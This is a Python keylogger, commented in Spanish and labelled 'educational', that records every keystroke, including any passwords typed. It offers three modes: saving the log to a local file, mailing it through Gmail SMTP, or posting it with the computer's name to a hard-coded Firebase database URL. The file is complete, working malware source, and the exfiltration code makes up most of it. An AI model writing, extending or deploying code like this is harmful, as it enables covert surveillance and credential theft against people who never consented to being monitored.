import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import os
import sys
import json
import urllib.request

# Configuración Firebase
FIREBASE_DB_URL = "https://lozano-1690859356322-default-rtdb.firebaseio.com"

class Keylogger:
    def __init__(self, intervalo=60, metodo_reporte="archivo", email="", password="", user_id=""):
        self.intervalo = intervalo
        self.metodo_reporte = metodo_reporte
        self.log = ""
        self.inicio_dt = datetime.now()
        self.fin_dt = datetime.now()
        self.user_id = user_id
        
        # Configuración de email (solo si se usa)
        self.email = email
        self.password = password
        
    def callback(self, event):
        nombre = event.name
        
        if len(nombre) > 1:
            if nombre == "space":
                nombre = " "
            elif nombre == "enter":
                nombre = "[ENTER]\n"
            elif nombre == "decimal":
                nombre = "."
            else:
                nombre = f"[{nombre.upper()}]"
        
        self.log += nombre
    
    def guardar_log(self):
        if self.log:
            self.fin_dt = datetime.now()
            
            # Crear nombre de archivo con timestamp
            nombre_archivo = f"keylog_{self.inicio_dt.strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(nombre_archivo, "a") as f:
                f.write(f"\n\n--- Registro {self.inicio_dt} a {self.fin_dt} ---\n")
                f.write(self.log)
            
            print(f"[+] Log guardado en: {nombre_archivo}")
            
            # Reiniciar log
            self.log = ""
            self.inicio_dt = datetime.now()
            
    def enviar_firebase(self):
        if self.log and self.user_id:
            try:
                url = f"{FIREBASE_DB_URL}/keylogs/{self.user_id}.json"
                data = {
                    "timestamp": datetime.now().isoformat(),
                    "content": self.log,
                    "device": os.environ.get('COMPUTERNAME', 'Unknown')
                }
                
                req = urllib.request.Request(
                    url, 
                    data=json.dumps(data).encode('utf-8'),
                    headers={'Content-Type': 'application/json'},
                    method='POST'
                )
                
                with urllib.request.urlopen(req) as response:
                    print(f"[+] Log enviado a Firebase: {response.status}")
                
            except Exception as e:
                print(f"[-] Error enviando a Firebase: {e}")
            
            # Reiniciar log independientemente del éxito para no duplicar en memoria
            self.log = ""
            self.inicio_dt = datetime.now()

    
    def enviar_email(self, mensaje):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, mensaje)
            server.quit()
            print("[+] Email enviado correctamente")
        except Exception as e:
            print(f"[-] Error enviando email: {e}")
    
    def reportar(self):
        if self.log:
            if self.metodo_reporte == "email" and self.email and self.password:
                self.enviar_email(f"\n\n--- Keylog ---\n{self.log}")
            elif self.metodo_reporte == "archivo":
                self.guardar_log()
            elif self.metodo_reporte == "firebase":
                self.enviar_firebase()
        
        timer = Timer(interval=self.intervalo, function=self.reportar)
        timer.daemon = True
        timer.start()
    
    def iniciar(self):
        self.inicio_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        
        print(f"[+] Keylogger iniciado (Modo: {self.metodo_reporte})")
        print("[!] Presiona ESC para detener")
        
        self.reportar()
        keyboard.wait("esc")
        
        # Guardar lo restante al salir
        if self.metodo_reporte == "archivo":
            self.guardar_log()
        elif self.metodo_reporte == "firebase":
            # Forzar envío final
            self.enviar_firebase()
        
        print("[+] Keylogger detenido")

# Versión MÍNIMA para propósitos educativos
def keylogger_minimo():
    """
    Versión mínima para entender el concepto básico.
    Guarda en archivo 'teclas.txt' en el directorio actual.
    """
    import keyboard
    
    def guardar_tecla(event):
        with open("teclas.txt", "a") as f:
            f.write(event.name + " ")
    
    print("[EDUCACIONAL] Keylogger mínimo iniciado")
    print("[EDUCACIONAL] Presiona CTRL+C para detener")
    
    keyboard.on_release(guardar_tecla)
    keyboard.wait()

if __name__ == "__main__":
    print("=" * 50)
    print("KEYLOGGER EDUCATIVO - SOLO PARA APRENDIZAJE")
    print("=" * 50)
    print("\nOpciones:")
    print("1. Keylogger mínimo (archivo local)")
    print("2. Keylogger avanzado (configurable)")
    print("3. Keylogger WEB (Firebase PoC)")
    
    opcion = input("\nSelecciona opción (1-3): ")
    
    if opcion == "1":
        keylogger_minimo()
    elif opcion == "2":
        # Configuración básica - MODIFICAR SEGÚN NECESIDAD
        intervalo = 30  # Segundos entre guardados
        metodo = "archivo"  # "archivo" o "email"
        
        keylogger = Keylogger(
            intervalo=intervalo,
            metodo_reporte=metodo
        )
        keylogger.iniciar()
    elif opcion == "3":
        print("\n--- Configuración Firebase ---")
        user_id = input("Ingresa tu UID de Firebase (copiar del dashboard): ").strip()
        
        if not user_id:
            print("Error: UID necesario para conectar a tu cuenta.")
        else:
            print("Iniciando modo Web...")
            # Intervalo corto para pruebas
            keylogger = Keylogger(
                intervalo=10, 
                metodo_reporte="firebase",
                user_id=user_id
            )
            keylogger.iniciar()

    else:
        print("Opción no válida")